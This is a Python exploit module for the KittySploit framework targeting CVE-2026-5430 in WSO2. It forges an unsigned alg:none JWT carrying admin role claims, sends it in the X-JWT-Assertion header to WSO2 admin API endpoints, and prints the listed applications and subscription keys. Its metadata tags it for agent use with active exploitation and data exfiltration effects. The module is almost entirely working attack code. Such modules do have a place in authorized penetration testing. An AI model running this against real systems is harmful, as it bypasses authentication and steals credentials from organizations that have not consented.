#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WSO2 CVE-2026-5430 JWT alg:none admin API access via X-JWT-Assertion."""

import base64
import json
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "WSO2 JWT Auth Bypass Admin Enum (CVE-2026-5430)",
        "description": (
            "Uses CVE-2026-5430 to reach WSO2 admin APIs with a forged alg:none JWT in "
            "X-JWT-Assertion. Lists applications and subscription keys when the gateway "
            "fails open on unsupported JWT algorithms."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-5430"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-5430",
            "https://github.com/advisories/GHSA-j7vh-5w8q-4m4x",
        ],
        "tags": [
            "wso2",
            "jwt",
            "auth-bypass",
            "admin",
            "enum",
            "credentials",
            "cve-2026-5430",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "requires": {
                "tech_hints_any": ["wso2"],
                "endpoint_pattern_any": ["/api/am/admin/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "JWT bypass"},
                    {"capability": "credentials", "from_detail": "consumer keys"},
                ],
                "suggested_followups": [],
            },
        },
    }

    subject = OptString("admin", "JWT sub claim for forged token", False, advanced=True)
    list_apps = OptBool(True, "GET /api/am/admin/v4/applications", False)
    list_keys = OptBool(True, "GET /api/am/admin/v4/keys", False)

    @staticmethod
    def _forge_none_jwt(subject: str) -> str:
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
        ).decode().rstrip("=")
        payload = base64.urlsafe_b64encode(
            json.dumps(
                {
                    "sub": subject,
                    "iss": "wso2.org/products/am",
                    "http://wso2.org/claims/role": ["admin", "Internal/subscriber"],
                    "exp": int(time.time()) + 7200,
                },
                separators=(",", ":"),
            ).encode()
        ).decode().rstrip("=")
        return f"{header}.{payload}."

    def _get(self, path: str, token: str):
        return self.http_request(
            method="GET",
            path=path,
            headers={"X-JWT-Assertion": token, "Accept": "application/json"},
            allow_redirects=False,
        )

    def run(self):
        token = self._forge_none_jwt(str(self.subject or "admin"))
        print_status("CVE-2026-5430 — WSO2 JWT alg:none admin access")
        hit = False
        if bool(self.list_apps):
            response = self._get("/api/am/admin/v4/applications", token)
            if response and int(response.status_code or 0) == 200:
                hit = True
                print_success("Applications endpoint accessible with forged JWT")
                body = (response.text or "")[:1200]
                if body:
                    print_info(body)
        if bool(self.list_keys):
            response = self._get("/api/am/admin/v4/keys", token)
            if response and int(response.status_code or 0) == 200:
                hit = True
                print_success("Keys endpoint accessible with forged JWT")
                body = (response.text or "")[:1200]
                if body:
                    print_info(body)
        if not hit:
            print_error("Forged JWT did not grant admin API access")
            return False
        return True
